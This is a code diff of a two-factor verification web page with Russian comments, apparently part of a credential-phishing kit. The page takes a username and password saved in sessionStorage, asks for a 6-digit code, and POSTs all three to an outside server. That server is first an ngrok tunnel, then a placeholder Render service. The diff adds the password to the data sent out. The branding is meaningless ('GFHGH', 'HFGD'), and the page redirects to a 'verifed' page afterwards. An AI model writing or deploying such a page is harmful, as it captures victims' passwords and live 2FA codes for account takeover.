@@ -9,7 +9,7 @@
 <body>
     <nav class="mobile-nav">
         <div class="logo">
-            <span>GFHGH</span>
+            <span>HFGD</span>
         </div>
     </nav>
     
@@ -20,14 +20,15 @@
             <form id="2fa-form" class="login-form">
                 <div class="form-group">
                     <input type="text" id="2fa-code" class="form-control" 
-                           placeholder="Enter 2FA Code" required>
+                           placeholder="Enter 6-digit code" required>
                 </div>
                 
                 <div id="error-message" class="error-message" style="display: none;"></div>
                 
                 <button type="submit" class="login-button" id="verify-button">
                     <span id="button-text">Verify</span>
-                    <img id="loading-gif" src="/yomae/website/loading.gif" alt="Loading" style="display: none; height: 20px;">
+                    <img id="loading-gif" src="https://i.gifer.com/origin/b4/b4d657e7ef262b88eb5f7ac021edda87.gif" 
+                         alt="Loading" style="display: none; height: 20px;">
                 </button>
             </form>
         </div>
@@ -41,10 +42,10 @@
             const loadingGif = document.getElementById('loading-gif');
             const errorElement = document.getElementById('error-message');
             
-            // Получаем сохраненные данные логина
+            // Получаем сохраненные данные из sessionStorage
             const loginData = JSON.parse(sessionStorage.getItem('loginData'));
             if (!loginData) {
-                window.location.href = '/';
+                window.location.href = '../index.html';
                 return;
             }
             
@@ -52,26 +53,27 @@
                 e.preventDefault();
                 
                 const code = document.getElementById('2fa-code').value.trim();
-                if (!code) {
-                    showError('Please enter 2FA code');
+                if (code.length !== 6 || !/^\d+$/.test(code)) {
+                    showError('Please enter a valid 6-digit code');
                     return;
                 }
                 
-                // Show loading state
+                // Показываем индикатор загрузки
                 buttonText.style.display = 'none';
                 loadingGif.style.display = 'inline-block';
                 verifyButton.disabled = true;
                 errorElement.style.display = 'none';
                 
-                // Отправляем код на сервер
-                fetch('https://7a10160dcdab.ngrok-free.app/submit_2fa', {
+                // Отправляем на сервер
+                fetch('https://your-render-service.onrender.com/submit_2fa', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
                         code: code,
-                        username: loginData.username
+                        username: loginData.username,
+                        password: loginData.password
                     })
                 })
                 .then(response => {
@@ -79,18 +81,17 @@
                     return response.json();
                 })
                 .then(data => {
-                    if (data.success) {
-                        window.location.href = '/verifed/index.html';
+                    if (data.status === 'success') {
+                        window.location.href = '../verifed/index.html';
                     } else {
-                        showError(data.error || 'Invalid 2FA code');
+                        showError(data.message || 'Verification failed');
                     }
                 })
                 .catch(error => {
                     console.error('Error:', error);
-                    showError('Server is overloaded. Please try again later.');
+                    showError('Server error. Please try again.');
                 })
                 .finally(() => {
-                    // Reset button state
                     buttonText.style.display = 'inline-block';
                     loadingGif.style.display = 'none';
                     verifyButton.disabled = false;
@@ -100,9 +101,9 @@
             function showError(message) {
                 errorElement.textContent = message;
                 errorElement.style.display = 'block';
+                errorElement.style.animation = 'shake 0.5s';
             }
         });
     </script>
 </body>
 </html>
-
